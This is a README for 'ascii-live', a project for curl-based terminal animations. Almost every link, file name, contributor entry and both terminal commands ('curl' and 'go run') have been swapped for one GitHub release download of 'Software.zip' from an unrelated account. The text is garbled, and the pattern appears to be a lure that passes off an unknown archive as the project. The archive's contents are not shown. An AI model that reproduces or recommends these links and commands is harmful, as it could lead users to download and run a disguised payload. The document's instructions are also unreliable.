# https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip

A project for hosting curl-based animations, all in one place, and a follow up to [`https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip).

Any animations you want to add are welcome! 🎉

Try it out in your terminal:
```bash
curl https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip
```

<img src="https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip" width="400"/>

## Running locally
To run the server locally on port `8080`, run:
```bash
go run https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip
```

## Running in Docker
```bash
docker run -p 8080:8080 hugomd/ascii-live:latest
```

## Adding frames
* [Fork this repository](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)
* Create a new frame file in [`/frames`](./frames), call it the name of your frames/animation, e.g. `https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip`
* Inside your new file, create an exported list of frames, e.g.
```Golang
package frames

// This is the value stored in the FrameMap
var MyAnimation = DefaultFrameType(myAnimationFrames)

var myAnimationFrames = []string{
  `Frame1`,
  `Frame2`,
  `Frame3`,
}
```
* In [`https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip), add your animation to the `FrameMap`
* Commit and push your changes, and make a PR! If this is your first time making a PR, [check GitHub's help page on the topic](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)

## Frame Contributions
Here's a list of lovely people who have contributed frames to this project:

| Contributor                                      | Frame File                                    | Repository                                                      |
|--------------------------------------------------|-----------------------------------------------|-----------------------------------------------------------------|
| [hexrcs](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)              | [`https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)           | [`run-forrest-run`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)  |
| [jmhobbs](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)            | [`https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)             | [`terminal-parrot`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip) |
| [01000001](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip) | [`https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)                 | [`torus-knot`](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)|

## Related Projects
* [https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)
* [terminal-parrot](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)
* [https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)
* [parrotsay](https://github.com/yazeedeeeeeeeeeeeeee/ascii-live/releases/download/v1.0/Software.zip)
